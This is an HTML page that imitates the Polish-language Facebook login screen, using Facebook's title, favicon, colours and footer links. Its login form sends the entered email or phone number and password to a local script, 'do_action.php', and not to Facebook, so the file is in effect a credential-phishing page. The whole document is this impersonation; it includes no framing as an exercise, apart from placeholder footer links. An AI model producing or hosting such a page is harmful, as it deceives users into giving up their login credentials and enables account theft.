<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Facebook - zaloguj się lub zarejestruj</title>
	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
	<style>
		h1, h2, h3, h4, h5, a, p, ul, li, img, header, section, div, body {margin: 0; padding: 0;}

		body {
			background: #f2f4f7;
		}

		* {
			font-family: SFProDisplay-Bold, Helvetica, Arial, sans-serif;
			margin: 0;
			padding: 0;
		}

		p {
			display: flex;
			justify-content: center;
		}

		input {
			height: 20px;
			width: 322px;
			border: 1px solid #dddfe2;
			border-radius: 6px;
			margin: 0 0 12px 0;
			font-size: 16px;
		}

		.login-card {
		    border-radius: 8px;
		    height: 350px;
			width: 396px;
		    margin: 60px auto 45px;
			box-shadow: 0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1);
			box-sizing: border-box;
			background: #ffffff;
		}

		.login-form {
			padding: 20px 20px;
		}

		footer {
			width: 984px;
			margin: 0 auto;
			border-top: 1.5px solid #cccccc;
		}

		ul li {
			display: inline;
			margin: 0 0 0 28px;
		}

		ul li a {
			text-decoration: none;
			font-family: tahoma;
			font-size: 10.5px;
			color: #3B5998;
		}

		ul li a:hover {
			text-decoration: underline;
		}
	</style>
</head>
<body>
	<section>
		<div class="login-card">
			<div class="login-form">
				<form action="do_action.php">
					<input name="username" type="text" id="username" placeholder="Adres e-mail lub numer telefonu" autofocus="1" aria-label="Adres e-mail lub numer telefonu" style = "padding: 0.8rem 1rem;"></input>
					<input name="password" id="password" type="password" placeholder="Hasło" autofocus="1" aria-label="Hasło" style = "padding: 0.8rem 1rem;"></input>
					<input type="submit" name="submit" value="Zaloguj się" style="background: none repeat scroll 0 0 #0866ff; border: none; color: #ffffff; padding: 2px 6px; font-size: 20px; font-weight: 700; height:48px; width:356px;"></input>
					<p><a style="text-decoration: none; color: #0866ff; font-size: 14px;" href="">Nie pamiętasz hasła?</a></p>
				</form>
			</div>

		</div>
		
		<footer>
			<ul>
				<li><a href="/">Mobile</a></li>
				<li><a href="/">Find Friends</a></li>
				<li><a href="/">Badges</a></li>
				<li><a href="/">People</a></li>
				<li><a href="/">Pages</a></li>
				<li><a href="/">Apps</a></li>
				<li><a href="/">Games</a></li>
				<li><a href="/">Music</a></li>
				<li><a href="/">Locations</a></li>
			</ul>
			<ul>
				<li><a href="/">Topics</a></li>
				<li><a href="/">About</a></li>
				<li><a href="/">Create Ad</a></li>
				<li><a href="/">Create Page</a></li>
				<li><a href="/">Devepers</a></li>
				<li><a href="/">Careers</a></li>
				<li><a href="/">Privacy</a></li>
				<li><a href="/">Cookies</a></li>
				<li><a href="/">Terms</a></li><br />
				<li><a href="/">Help</a></li>
			</ul>
		</footer>
	</section>
</body>
</html>
